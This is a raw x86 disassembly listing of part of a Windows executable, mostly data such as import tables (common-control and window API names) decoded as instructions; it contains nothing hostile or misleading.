  428169:	adc    BYTE PTR [eax],al
  42816b:	js     0x428194
  42816d:	adc    BYTE PTR [eax],al
  42816f:	test   al,0x13
  428171:	adc    BYTE PTR [eax],al
  428173:	fs push esi
  428175:	adc    BYTE PTR [eax],al
  428177:	jp     0x428199
  428179:	adc    BYTE PTR [eax],al
  42817b:	enter  0x1052,0x0
  42817f:	loop   0x4281f4
  428181:	adc    BYTE PTR [eax],al
  428183:	ja     0x4281f0
  428185:	adc    BYTE PTR [eax],al
  428187:	cmp    al,0x2b
  428189:	adc    BYTE PTR [eax],al
  42818b:	rcl    BYTE PTR [edx],1
  42818d:	adc    BYTE PTR [eax],al
  42818f:	sbb    DWORD PTR [eax+0x10],ebx
  428192:	add    BYTE PTR [esi],ah
  428194:	add    dl,BYTE PTR [eax]
  428196:	add    BYTE PTR [edi+0xc],dh
  428199:	adc    BYTE PTR [eax],al
  42819b:	mov    dh,BYTE PTR [ecx]
  42819d:	adc    BYTE PTR [eax],al
  42819f:	out    dx,al
  4281a0:	sbb    eax,0xed80010
  4281a5:	adc    BYTE PTR [eax],al
  4281a7:	add    eax,0x3300107f
  4281ac:	jbe    0x4281be
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [edi-0x7f],bh
  4281cd:	inc    edx
  4281ce:	add    BYTE PTR [ebx-0x78ffbd7f],al
  4281d4:	add    DWORD PTR [edx+0x0],0x42818b
  4281db:	pop    DWORD PTR [ecx-0x7e6cffbe]
  4281e1:	inc    edx
  4281e2:	add    BYTE PTR [edi-0x64ffbd7f],dl
  4281e8:	add    DWORD PTR [edx+0x0],0x42819f
  4281ef:	mov    ds:0xa7004281,eax
  4281f4:	add    DWORD PTR [edx+0x0],0x4281ab
  4281fb:	cmp    eax,DWORD PTR [edx-0x7dc0ffbe]
  428201:	inc    edx
  428202:	add    BYTE PTR [ebx-0x7e],al
  428205:	inc    edx
  428206:	add    BYTE PTR [edi-0x7e],al
  428209:	inc    edx
  42820a:	add    BYTE PTR [ebx-0x7e],cl
  42820d:	inc    edx
  42820e:	add    BYTE PTR [edi-0x7e],cl
  428211:	inc    edx
  428212:	add    BYTE PTR [ebx-0x7e],dl
  428215:	inc    edx
  428216:	add    BYTE PTR [edi-0x7e],dl
  428219:	inc    edx
  42821a:	add    BYTE PTR [ebx-0x7e],bl
  42821d:	inc    edx
  42821e:	add    BYTE PTR [edi-0x7e],bl
  428221:	inc    edx
  428222:	add    BYTE PTR [ebx-0x7e],ah
  428225:	inc    edx
  428226:	add    BYTE PTR [edi-0x7e],ah
  428229:	inc    edx
  42822a:	add    BYTE PTR [ebx-0x7e],ch
  42822d:	inc    edx
  42822e:	add    BYTE PTR [edi-0x7e],ch
  428231:	inc    edx
  428232:	add    BYTE PTR [ebx-0x7e],dh
  428235:	inc    edx
  428236:	add    BYTE PTR [edi-0x7e],dh
  428239:	inc    edx
  42823a:	add    BYTE PTR [ecx],ch
  42823c:	or     al,0x10
  42823e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428244:	push   edi
  428245:	adc    BYTE PTR [eax],al
  428247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428248:	outs   dx,DWORD PTR ds:[esi]
  428249:	adc    BYTE PTR [eax],al
  42824b:	push   ebx
  42824c:	popa   
  42824d:	adc    BYTE PTR [eax],al
  42824f:	add    dh,BYTE PTR [ebp+0x10]
  428252:	add    dh,cl
  428254:	jle    0x428266
  428256:	add    BYTE PTR [esi+edx*2],dl
  428259:	adc    BYTE PTR [eax],al
  42825b:	mov    al,0x68
  42825d:	adc    BYTE PTR [eax],al
  42825f:	aas    
  428260:	inc    esp
  428261:	adc    BYTE PTR [eax],al
  428263:	pop    ebp
  428264:	and    DWORD PTR [eax],edx
  428266:	add    bl,dl
  428268:	jl     0x42827a
  42826a:	add    BYTE PTR [edx+0xb],dh
  42826d:	adc    BYTE PTR [eax],al
  42826f:	inc    edx
  428270:	push   eax
  428271:	adc    BYTE PTR [eax],al
  428273:	mov    ebp,0xbb001074
  428278:	pop    ds
  428279:	adc    BYTE PTR [eax],al
  42827b:	sub    DWORD PTR [eax+0x10],eax
  42827e:	add    BYTE PTR [ecx],dh
  428280:	ja     0x428292
  428282:	add    bl,dl
  428284:	sbb    dl,BYTE PTR [eax]
  428286:	add    BYTE PTR [esi+0x1e],ch
  428289:	adc    BYTE PTR [eax],al
  42828b:	or     ch,BYTE PTR [esi]
  42828d:	adc    BYTE PTR [eax],al
  42828f:	sbb    eax,0xa100103e
  428294:	data16 adc BYTE PTR [eax],al
  428297:	xchg   ecx,eax
  428298:	bound  edx,QWORD PTR [eax]
  42829a:	add    BYTE PTR [esi],bh
  42829c:	dec    edi
  42829d:	adc    BYTE PTR [eax],al
  42829f:	in     eax,dx
  4282a0:	adc    BYTE PTR fs:[eax],al
  4282a3:	sub    bl,BYTE PTR [ecx+0x10]
  4282a6:	add    BYTE PTR [esi+0x43],al
  4282a9:	adc    BYTE PTR [eax],al
  4282ab:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282af:	rol    BYTE PTR [esi+0x10],0x0
  4282b3:	in     eax,0x31
  4282b5:	adc    BYTE PTR [eax],al
  4282b7:	mov    esp,0x7b00104f
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0x8b
  4282cc:	add    BYTE PTR [edx+0x0],0x8f
  4282d0:	add    BYTE PTR [edx+0x0],0x93
  4282d4:	add    BYTE PTR [edx+0x0],0x97
  4282d8:	add    BYTE PTR [edx+0x0],0x9b
  4282dc:	add    BYTE PTR [edx+0x0],0x9f
  4282e0:	add    BYTE PTR [edx+0x0],0xa3
  4282e4:	add    BYTE PTR [edx+0x0],0xa7
  4282e8:	add    BYTE PTR [edx+0x0],0xab
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xe1
  4282fc:	and    dl,BYTE PTR [eax]
  4282fe:	add    bh,bh
  428300:	push   ecx
  428301:	adc    BYTE PTR [eax],al
  428303:	test   BYTE PTR ds:0x1d0c0010,0x10
  42830a:	add    BYTE PTR [ebx],al
  42830c:	sbb    dl,BYTE PTR [eax]
  42830e:	add    ch,ah
  428310:	or     dl,BYTE PTR [eax]
  428312:	add    BYTE PTR [edi+0x42001035],bl
  428318:	pop    edi
  428319:	adc    BYTE PTR [eax],al
  42831b:	adc    eax,0xd300103f
  428320:	cmp    dl,BYTE PTR [eax]
  428322:	add    BYTE PTR [ebp+0x1001021],ah
  428328:	sbb    al,0x10
  42832a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428330:	adc    BYTE PTR cs:[eax],al
  428333:	push   eax
  428334:	adc    BYTE PTR [bx+si],al
  428337:	mov    edi,0xfb00102d
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xb
  42834c:	add    DWORD PTR [edx+0x0],0xf
  428350:	add    DWORD PTR [edx+0x0],0x13
  428354:	add    DWORD PTR [edx+0x0],0x17
  428358:	add    DWORD PTR [edx+0x0],0x1b
  42835c:	add    DWORD PTR [edx+0x0],0x1f
  428360:	add    DWORD PTR [edx+0x0],0x23
  428364:	add    DWORD PTR [edx+0x0],0x27
  428368:	add    DWORD PTR [edx+0x0],0x2b
  42836c:	add    DWORD PTR [edx+0x0],0x2f
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0xffffff98
  42837c:	pusha  
  42837d:	adc    BYTE PTR [eax],al
  42837f:	pop    ebp
  428380:	js     0x428392
  428382:	add    BYTE PTR [esi],bh
  428384:	dec    eax
  428385:	adc    BYTE PTR [eax],al
  428387:	cmp    al,0x7a
  428389:	adc    BYTE PTR [eax],al
  42838b:	aam    0x9
  42838d:	adc    BYTE PTR [eax],al
  42838f:	or     cl,BYTE PTR [ebx]
  428391:	adc    BYTE PTR [eax],al
  428393:	pop    ebx
  428394:	push   ebp
  428395:	adc    BYTE PTR [eax],al
  428397:	mov    esi,0x6001032
  42839c:	xor    edx,DWORD PTR [eax]
  42839e:	add    BYTE PTR [esi-0x16ffefc0],al
  4283a4:	and    eax,0x61460010
  4283a9:	adc    BYTE PTR [eax],al
  4283ab:	adc    DWORD PTR [ebp+0x10],ebp
  4283ae:	add    al,al
  4283b0:	dec    esi
  4283b1:	adc    BYTE PTR [eax],al
  4283b3:	jae    0x4283d3
  4283b5:	adc    BYTE PTR [eax],al
  4283b7:	dec    ebx
  4283b8:	add    eax,0x837b0010
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff8b
  4283cc:	add    DWORD PTR [edx+0x0],0xffffff8f
  4283d0:	add    DWORD PTR [edx+0x0],0xffffff93
  4283d4:	add    DWORD PTR [edx+0x0],0xffffff97
  4283d8:	add    DWORD PTR [edx+0x0],0xffffff9b
  4283dc:	add    DWORD PTR [edx+0x0],0xffffff9f
  4283e0:	add    DWORD PTR [edx+0x0],0xffffffa3
  4283e4:	add    DWORD PTR [edx+0x0],0xffffffa7
  4283e8:	add    DWORD PTR [edx+0x0],0xffffffab
  4283ec:	add    DWORD PTR [edx+0x0],0xffffffaf
  4283f0:	add    DWORD PTR [edx+0x0],0xffffffb3
  4283f4:	add    DWORD PTR [edx+0x0],0xffffffb7
  4283f8:	add    DWORD PTR [edx+0x0],0x0
	...
  428404:	cmp    dh,BYTE PTR [ecx+0x52]
  428407:	dec    edi
  428408:	add    BYTE PTR [eax],al
  42840a:	add    BYTE PTR [eax],al
  42840c:	pusha  
  42840d:	lea    eax,[edx]
  42840f:	add    BYTE PTR [ecx],al
  428411:	add    BYTE PTR [eax],al
  428413:	add    BYTE PTR [ecx],al
  428415:	add    BYTE PTR [eax],al
  428417:	add    BYTE PTR [ecx],al
  428419:	add    BYTE PTR [eax],al
  42841b:	add    BYTE PTR [eax],dh
  42841d:	lea    eax,[edx]
  42841f:	add    BYTE PTR [eax-0x73],dl
  428422:	add    al,BYTE PTR [eax]
  428424:	inc    eax
  428425:	lea    eax,[edx]
	...
  428433:	add    al,bh
  428435:	test   DWORD PTR [edx],eax
  428437:	add    BYTE PTR [esi+eax*4],dl
  42843a:	add    al,BYTE PTR [eax]
  42843c:	xchg   BYTE PTR es:[edx],al
  42843f:	add    BYTE PTR [eax],bh
  428441:	xchg   BYTE PTR [edx],al
  428443:	add    BYTE PTR [eax-0x7a],dl
  428446:	add    al,BYTE PTR [eax]
  428448:	xchg   BYTE PTR fs:[edx],al
  42844b:	add    BYTE PTR [esi-0x7a],bh
  42844e:	add    al,BYTE PTR [eax]
  428450:	add    BYTE PTR [eax],al
  428452:	add    BYTE PTR [eax],al
  428454:	mov    al,ds:0xbe000286
  428459:	xchg   BYTE PTR [edx],al
  42845b:	add    ah,cl
  42845d:	xchg   BYTE PTR [edx],al
  42845f:	add    dl,bl
  428461:	xchg   BYTE PTR [edx],al
  428463:	add    dh,ch
  428465:	xchg   BYTE PTR [edx],al
  428467:	add    ah,bh
  428469:	xchg   BYTE PTR [edx],al
  42846b:	add    BYTE PTR [esi],cl
  42846d:	xchg   DWORD PTR [edx],eax
  42846f:	add    BYTE PTR [eax],ah
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    BYTE PTR [esi],ch
  428475:	xchg   DWORD PTR [edx],eax
  428477:	add    BYTE PTR [eax-0x79],al
  42847a:	add    al,BYTE PTR [eax]
  42847c:	push   edx
  42847d:	xchg   DWORD PTR [edx],eax
  42847f:	add    BYTE PTR [eax-0x79],ah
  428482:	add    al,BYTE PTR [eax]
  428484:	outs   dx,BYTE PTR ds:[esi]
  428485:	xchg   DWORD PTR [edx],eax
  428487:	add    BYTE PTR [eax-0x73fffd79],al
  42848d:	xchg   DWORD PTR [edx],eax
  42848f:	add    BYTE PTR [edx-0x4bfffd79],ah
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    dh,al
  428499:	xchg   DWORD PTR [edx],eax
  42849b:	add    dl,dl
  42849d:	xchg   DWORD PTR [edx],eax
  42849f:	add    dl,ah
  4284a1:	xchg   DWORD PTR [edx],eax
  4284a3:	add    dl,dh
  4284a5:	xchg   DWORD PTR [edx],eax
  4284a7:	add    BYTE PTR [eax],cl
  4284a9:	mov    BYTE PTR [edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4],dl
  4284ae:	add    al,BYTE PTR [eax]
  4284b0:	mov    BYTE PTR es:[edx],al
  4284b3:	add    BYTE PTR [eax+ecx*4],bh
  4284b6:	add    al,BYTE PTR [eax]
  4284b8:	dec    esi
  4284b9:	mov    BYTE PTR [edx],al
  4284bb:	add    BYTE PTR [eax+ecx*4+0x2],bl
  4284bf:	add    BYTE PTR [eax+ecx*4+0x2],ch
  4284c3:	add    BYTE PTR [esi-0x78],bh
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	xchg   edx,eax
  4284c9:	mov    BYTE PTR [edx],al
  4284cb:	add    BYTE PTR [eax-0x45fffd78],ch
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    ah,cl
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    ah,bl
  4284d9:	mov    BYTE PTR [edx],al
  4284db:	add    ah,ch
  4284dd:	mov    BYTE PTR [edx],al
  4284df:	add    ah,bh
  4284e1:	mov    BYTE PTR [edx],al
  4284e3:	add    BYTE PTR [esi],cl
  4284e5:	mov    DWORD PTR [edx],eax
  4284e7:	add    BYTE PTR [ecx+ecx*4],bl
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	sub    cl,BYTE PTR [ecx-0x76bdfffe]
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	push   esp
  4284f5:	mov    DWORD PTR [edx],eax
  4284f7:	add    BYTE PTR [esi-0x77],ah
  4284fa:	add    al,BYTE PTR [eax]
  4284fc:	jb     0x428487
  4284fe:	add    al,BYTE PTR [eax]
  428500:	jle    0x42848b
  428502:	add    al,BYTE PTR [eax]
  428504:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  42850a:	add    al,BYTE PTR [eax]
  42850c:	mov    al,0x89
  42850e:	add    al,BYTE PTR [eax]
  428510:	mov    esi,0xd0000289
  428515:	mov    DWORD PTR [edx],eax
  428517:	add    dl,ah
  428519:	mov    DWORD PTR [edx],eax
  42851b:	add    BYTE PTR [eax],al
  42851d:	add    BYTE PTR [eax],al
  42851f:	add    ah,bh
  428521:	mov    DWORD PTR [edx],eax
  428523:	add    BYTE PTR [eax],al
  428525:	add    BYTE PTR [eax],al
  428527:	add    BYTE PTR [edx],bl
  428529:	mov    al,BYTE PTR [edx]
  42852b:	add    BYTE PTR [edx+ecx*4],ch
  42852e:	add    al,BYTE PTR [eax]
  428530:	mov    al,BYTE PTR ds:[edx]
  428533:	add    BYTE PTR [edx+ecx*4+0x2],dl
  428537:	add    BYTE PTR [esi-0x76],ah
  42853a:	add    al,BYTE PTR [eax]
  42853c:	js     0x4284c8
  42853e:	add    al,BYTE PTR [eax]
  428540:	mov    BYTE PTR [edx-0x7559fffe],cl
  428546:	add    al,BYTE PTR [eax]
  428548:	mov    dh,0x8a
  42854a:	add    al,BYTE PTR [eax]
  42854c:	les    ecx,FWORD PTR [edx-0x752bfffe]
  428552:	add    al,BYTE PTR [eax]
  428554:	loop   0x4284e0
  428556:	add    al,BYTE PTR [eax]
  428558:	repnz mov al,BYTE PTR [edx]
  42855b:	add    dh,bh
  42855d:	mov    al,BYTE PTR [edx]
  42855f:	add    BYTE PTR [eax],dl
  428561:	mov    eax,DWORD PTR [edx]
  428563:	add    BYTE PTR [edx],ah
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    BYTE PTR [eax],bh
  428569:	mov    eax,DWORD PTR [edx]
  42856b:	add    BYTE PTR [esi-0x75],al
  42856e:	add    al,BYTE PTR [eax]
  428570:	push   edx
  428571:	mov    eax,DWORD PTR [edx]
  428573:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428577:	add    BYTE PTR [ebx+ecx*4-0x7463fffe],al
  42857e:	add    al,BYTE PTR [eax]
  428580:	stos   BYTE PTR es:[edi],al
  428581:	mov    eax,DWORD PTR [edx]
  428583:	add    BYTE PTR [esi-0x37fffd75],dh
  428589:	mov    eax,DWORD PTR [edx]
  42858b:	add    BYTE PTR [eax],al
  42858d:	add    BYTE PTR [eax],al
  42858f:	add    al,ch
  428591:	mov    eax,DWORD PTR [edx]
  428593:	add    dl,dh
  428595:	mov    eax,DWORD PTR [edx]
  428597:	add    BYTE PTR [eax],al
  428599:	mov    WORD PTR [edx],es
  42859b:	add    BYTE PTR [esp+ecx*4],cl
  42859e:	add    al,BYTE PTR [eax]
  4285a0:	sbb    al,0x8c
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	sub    cl,BYTE PTR [edx+eax*1+0x28c3600]
  4285ab:	add    BYTE PTR [eax-0x74],al
  4285ae:	add    al,BYTE PTR [eax]
  4285b0:	push   edx
  4285b1:	mov    WORD PTR [edx],es
  4285b3:	add    BYTE PTR [eax-0x74],ch
  4285b6:	add    al,BYTE PTR [eax]
  4285b8:	jle    0x428546
  4285ba:	add    al,BYTE PTR [eax]
  4285bc:	xchg   esp,eax
  4285bd:	mov    WORD PTR [edx],es
  4285bf:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  4285c6:	add    al,BYTE PTR [eax]
  4285c8:	les    ecx,FWORD PTR [edx+eax*1+0x28cd200]
  4285cf:	add    dl,ch
  4285d1:	mov    WORD PTR [edx],es
  4285d3:	add    ah,dh
  4285d5:	mov    WORD PTR [edx],es
  4285d7:	add    BYTE PTR [eax],al
  4285d9:	lea    eax,[edx]
  4285db:	add    BYTE PTR [esi],cl
  4285dd:	lea    eax,[edx]
	...
  4285ef:	add    BYTE PTR [ebx+0x6d],ah
  4285f2:	fs cs gs js 0x42865c
  4285f7:	add    BYTE PTR [edi],dl
  4285f9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285fd:	je     0x428671
  4285ff:	outs   dx,DWORD PTR ds:[esi]
  428600:	jns    0x428652
  428602:	jb     0x428673
  428604:	jo     0x42866b
  428606:	jb     0x42867c
  428608:	jns    0x42865d
  42860a:	push   0x50746565
  42860f:	popa   
  428610:	add    BYTE PTR gs:[bx+si],al
  428614:	pop    esp
  428615:	add    BYTE PTR [eax+0x72],dl
  428618:	outs   dx,DWORD PTR ds:[esi]
  428619:	jo     0x428680
  42861b:	jb     0x428691
  42861d:	jns    0x428672
  42861f:	push   0x57746565
  428624:	add    BYTE PTR [eax],al
  428626:	pop    ebx
  428627:	add    BYTE PTR [eax+0x72],dl
  42862a:	outs   dx,DWORD PTR ds:[esi]
  42862b:	jo     0x428692
  42862d:	jb     0x4286a3
  42862f:	jns    0x428684
  428631:	push   0x41746565
  428636:	add    BYTE PTR [eax],al
  428638:	dec    esi
  428639:	add    BYTE PTR [ecx+0x6d],cl
  42863c:	popa   
  42863d:	addr16 gs dec esp
  428640:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428647:	ins    BYTE PTR es:[edi],dx
  428648:	popa   
  428649:	arpl   WORD PTR [ebp+0x49],sp
  42864c:	arpl   WORD PTR [edi+0x6e],bp
  42864f:	add    BYTE PTR [ecx],dh
  428651:	add    BYTE PTR [ecx+0x6d],cl
  428654:	popa   
  428655:	addr16 gs dec esp
  428658:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42865f:	je     0x4286d3
  428661:	outs   dx,DWORD PTR ds:[esi]
  428662:	jns    0x428664
  428664:	inc    eax
  428665:	add    BYTE PTR [ecx+0x6d],cl
  428668:	popa   
  428669:	addr16 gs dec esp
  42866c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428673:	dec    ecx
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	popa   
  428676:	addr16 gs inc ebx
  428679:	outs   dx,DWORD PTR ds:[esi]
  42867a:	jne    0x4286ea
  42867c:	je     0x42867e
  42867e:	dec    esp
  42867f:	add    BYTE PTR [ecx+0x6d],cl
  428682:	popa   
  428683:	addr16 gs dec esp
  428686:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42868d:	outs   dx,DWORD PTR ds:[esi]
  42868e:	jbe    0x4286f5
  428690:	add    BYTE PTR [eax],al
  428692:	inc    ebx
  428693:	dec    edi
  428694:	dec    ebp
  428695:	inc    ebx
  428696:	push   esp
  428697:	dec    esp
  428698:	xor    esi,DWORD PTR [edx]
  42869a:	cs fs ins BYTE PTR es:[edi],dx
  42869d:	ins    BYTE PTR es:[edi],dx
  42869e:	add    BYTE PTR [eax],al
  4286a0:	push   edi
  4286a1:	add    BYTE PTR [ebx+0x72],al
  4286a4:	gs popa 
  4286a6:	je     0x42870d
  4286a8:	inc    esp
  4286a9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286b0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286b8:	jb     0x42871b
  4286ba:	ins    DWORD PTR es:[edi],dx
  4286bb:	push   edi
  4286bc:	add    BYTE PTR [eax],al
  4286be:	xor    al,BYTE PTR [edx]
  4286c0:	push   ebx
  4286c1:	gs je  0x428707
  4286c4:	popa   
  4286c5:	jb     0x42872c
  4286c7:	je     0x428719
  4286c9:	outs   dx,DWORD PTR ds:[esi]
  4286ca:	jae    0x4286cc
  4286cc:	cmp    al,BYTE PTR [ecx]
  4286ce:	inc    edi
  4286cf:	gs je  0x42871f
  4286d2:	gs jae 0x428748
  4286d5:	popa   
  4286d6:	addr16 gs inc ecx
  4286d9:	add    BYTE PTR [edx+0x61724400],dh
  4286df:	ja     0x428727
  4286e1:	jb     0x428744
  4286e3:	ins    DWORD PTR es:[edi],dx
  4286e4:	gs inc ebx
  4286e6:	outs   dx,DWORD PTR ds:[esi]
  4286e7:	outs   dx,BYTE PTR ds:[esi]
  4286e8:	je     0x42875c
  4286ea:	outs   dx,DWORD PTR ds:[esi]
  4286eb:	ins    BYTE PTR es:[edi],dx
  4286ec:	add    BYTE PTR [eax],al
  4286ee:	sbb    BYTE PTR [ecx],al
  4286f0:	inc    edi
  4286f1:	gs je  0x42873d
  4286f4:	arpl   WORD PTR [edi+0x6e],bp
  4286f7:	dec    ecx
  4286f8:	outs   dx,BYTE PTR ds:[esi]
  4286f9:	outs   dx,WORD PTR ds:[esi]
  4286fb:	add    bl,bh
  4286fd:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428701:	arpl   WORD PTR [ebx+0x50],bp
  428704:	outs   dx,DWORD PTR ds:[esi]
  428705:	jo     0x42877c
  428707:	jo     0x428756
  428709:	outs   dx,BYTE PTR gs:[esi]
  42870b:	jne    0x42870d
  42870d:	add    cl,bl
  42870f:	add    DWORD PTR [ebp+0x6f],ecx
  428712:	outs   dx,BYTE PTR ds:[esi]
  428713:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42871b:	push   edx
  42871c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428721:	add    BYTE PTR [ebx+0x68],al
  428724:	popa   
  428725:	jb     0x42877c
  428727:	jo     0x428799
  428729:	gs jb  0x428783
  42872c:	add    BYTE PTR [eax],al
  42872e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428732:	je     0x428778
  428734:	ins    BYTE PTR es:[edi],dx
  428735:	addr16 dec ecx
  428737:	je     0x42879e
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	push   esp
  42873b:	gs js  0x4287b2
  42873e:	inc    ecx
  42873f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428743:	push   0x774f776f
  428748:	outs   dx,BYTE PTR ds:[esi]
  428749:	gs fs push eax
  42874c:	outs   dx,DWORD PTR ds:[esi]
  42874d:	jo     0x4287c4
  42874f:	jo     0x4287c4
  428751:	add    BYTE PTR [eax],bl
  428753:	add    dl,BYTE PTR [edx+0x65]
  428756:	ins    DWORD PTR es:[edi],dx
  428757:	outs   dx,DWORD PTR ds:[esi]
  428758:	jbe    0x4287bf
  42875a:	push   eax
  42875b:	jb     0x4287cc
  42875d:	jo     0x4287b6
  42875f:	add    BYTE PTR [edi+0x2],bh
  428762:	push   ebx
  428763:	push   0x6957776f
  428768:	outs   dx,BYTE PTR ds:[esi]
  428769:	outs   dx,DWORD PTR fs:[esi]
  42876b:	ja     0x42876d
  42876d:	add    BYTE PTR [ebx],bl
  42876f:	add    BYTE PTR [ebx+0x61],al
  428772:	ins    BYTE PTR es:[edi],dx
  428773:	ins    BYTE PTR es:[edi],dx
  428774:	push   edi
  428775:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42877c:	outs   dx,DWORD PTR ds:[esi]
  42877d:	arpl   WORD PTR [edi+0x0],dx
  428780:	mov    dh,0x1
  428782:	dec    esp
  428783:	outs   dx,DWORD PTR ds:[esi]
  428784:	popa   
  428785:	fs dec ebp
  428787:	outs   dx,BYTE PTR gs:[esi]
  428789:	jne    0x4287cc
  42878b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428792:	arpl   WORD PTR [eax+0x54],bp
  428795:	outs   dx,DWORD PTR ds:[esi]
  428796:	push   esp
  428797:	push   0x69577369
  42879c:	outs   dx,BYTE PTR ds:[esi]
  42879d:	outs   dx,DWORD PTR fs:[esi]
  42879f:	ja     0x4287a1
  4287a1:	add    BYTE PTR [eax],ah
  4287a3:	add    dl,BYTE PTR [ebx+0x63]
  4287a6:	jb     0x428817
  4287a8:	ins    BYTE PTR es:[edi],dx
  4287a9:	ins    BYTE PTR es:[edi],dx
  4287aa:	push   edi
  4287ab:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	pop    DWORD PTR [eax]
  4287b6:	inc    esp
  4287b7:	gs push di
  4287ba:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287c1:	outs   dx,DWORD PTR ds:[esi]
  4287c2:	arpl   WORD PTR [edi+0x0],dx
  4287c5:	add    BYTE PTR [ecx],dh
  4287c7:	add    BYTE PTR [ebx+0x68],al
  4287ca:	popa   
  4287cb:	jb     0x42881d
  4287cd:	jb     0x428834
  4287cf:	jbe    0x428828
  4287d1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287d8:	fs popa 
  4287da:	je     0x428841
  4287dc:	push   edx
  4287dd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287e2:	xor    eax,DWORD PTR [ecx]
  4287e4:	inc    edi
  4287e5:	gs je  0x428835
  4287e8:	outs   dx,BYTE PTR gs:[esi]
  4287ea:	jne    0x428835
  4287ec:	je     0x428853
  4287ee:	ins    DWORD PTR es:[edi],dx
  4287ef:	dec    ecx
  4287f0:	inc    esp
  4287f1:	add    BYTE PTR ds:0x6e655302,ch
  4287f7:	fs dec esi
  4287f9:	outs   dx,DWORD PTR ds:[esi]
  4287fa:	je     0x428865
  4287fc:	data16 jns 0x42884c
  4287ff:	gs jae 0x428875
  428802:	popa   
  428803:	addr16 gs push edi
  428806:	add    BYTE PTR [eax],al
  428808:	mov    al,0x1
  42880a:	dec    esp
  42880b:	outs   dx,DWORD PTR ds:[esi]
  42880c:	popa   
  42880d:	fs dec ecx
  42880f:	arpl   WORD PTR [edi+0x6e],bp
  428812:	push   edi
  428813:	add    BYTE PTR [ecx+0x57734901],ah
  428819:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428820:	popa   
  428821:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428825:	add    BYTE PTR ds:0x74654701,dl
  42882b:	inc    esi
  42882c:	outs   dx,DWORD PTR ds:[esi]
  42882d:	jb     0x428894
  42882f:	addr16 jb 0x4288a1
  428832:	jne    0x4288a2
  428834:	fs push edi
  428836:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42883d:	add    DWORD PTR [edi+0x65],eax
  428840:	je     0x428899
  428842:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428849:	js     0x4288bf
  42884b:	inc    ecx
  42884c:	add    BYTE PTR [eax],al
  42884e:	add    DWORD PTR ds:[edi+0x65],eax
  428852:	je     0x4288a1
  428854:	gs jae 0x4288ca
  428857:	popa   
  428858:	addr16 gs push edi
  42885b:	add    BYTE PTR [ebx],ch
  42885d:	add    dl,BYTE PTR [ebx+0x65]
  428860:	outs   dx,BYTE PTR ds:[esi]
  428861:	fs dec ebp
  428863:	gs jae 0x4288d9
  428866:	popa   
  428867:	addr16 gs push edi
  42886a:	add    BYTE PTR [eax],al
  42886c:	das    
  42886d:	add    dl,BYTE PTR [ebx+0x65]
  428870:	je     0x4288b3
  428872:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428876:	gs push edi
  428878:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
